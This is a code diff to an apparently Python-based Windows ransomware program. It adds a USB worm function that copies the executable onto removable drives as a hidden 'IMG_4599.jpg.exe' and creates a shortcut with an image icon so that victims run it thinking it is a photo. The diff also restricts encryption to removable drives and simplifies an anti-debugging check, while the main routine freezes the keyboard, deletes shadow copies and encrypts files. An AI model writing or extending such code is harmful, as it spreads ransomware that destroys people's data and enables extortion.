@@ -10,13 +10,17 @@
 # The authors assume no liability for any misuse or damage caused.
 
 import os
+import re
 import sys
+import time
 import uuid
 import zlib
+import psutil
 import base64
 import string
 import winreg
 import ctypes
+import shutil
 import getpass
 import hashlib
 import subprocess
@@ -27,7 +31,7 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 import winshell
-from edx42 import dx42
+from edx42 import dx42 # type: ignore
 from Crypto.Cipher import AES  # hidden import
 from Crypto.PublicKey import RSA
 from win32com.client import Dispatch
@@ -403,7 +407,7 @@ def start_encryption():
             ]:
                 if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv(
                     "HOMEDRIVE"
-                ):
+                ) and ctypes.windll.kernel32.GetDriveTypeW(disk) == 2:
                     encrypt_directory(disk, bytes(key))
         else:
             encrypt_directory(
@@ -660,23 +664,45 @@ def is_debugger_present():
             return True
     except (AttributeError, ValueError):
         pass    
-    if os.name == 'nt':
-        try:
-            if ctypes.windll.kernel32.IsDebuggerPresent():
-                return True
-        except (ImportError, AttributeError):
-            pass         
-    if os.name == 'posix':
-        try:
-            with open('/proc/self/status') as f:
-                for line in f:
-                    if line.startswith('TracerPid:'):
-                        if int(line.split()[1]) != 0:
-                            return True
-                        break
-        except (IOError, ValueError):
-            pass
+    try:
+        if ctypes.windll.kernel32.IsDebuggerPresent():
+            return True
+    except (ImportError, AttributeError):
+        pass         
     return False
+
+def infect_usb():
+    worm_path = os.path.abspath(sys.executable)
+    exe_name = "IMG_4599.jpg.exe"
+    lnk_name = "IMG_4599.jpg.lnk"
+
+    for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
+        usb_root = f"{letter}:/"
+        try:
+            if os.path.exists(usb_root) and ctypes.windll.kernel32.GetDriveTypeW(f"{usb_root}") == 2:
+                exe_full = os.path.join(usb_root, exe_name)
+                lnk_full = os.path.join(usb_root, lnk_name)
+
+                shutil.copy2(worm_path, exe_full)
+
+                os.system(f'attrib +h +s "{exe_full}"')
+
+                vbs_code = f'''
+Set oWS = CreateObject("WScript.Shell")
+Set oLink = oWS.CreateShortcut("{lnk_full}")
+oLink.TargetPath = "{exe_full}"
+oLink.WorkingDirectory = "{os.path.dirname(exe_full)}"
+oLink.IconLocation = "imageres.dll,66"
+oLink.Save
+'''
+                with open("~tmp.vbs", "w", encoding="utf-8") as f:
+                    f.write(vbs_code)
+                os.system('wscript ~tmp.vbs')
+                os.remove("~tmp.vbs")
+        except Exception as e:
+            # print(f"Error while infect {usb_root}: {e}")
+            pass
+
 
 
 dev_mode = True
@@ -695,6 +721,7 @@ if __name__ == "__main__":
         freeze_keyboard()
         block_processes()
         disable_all()
+        infect_usb()
         delete_shadow_copy()
         start_encryption()
         change_wallpaper()
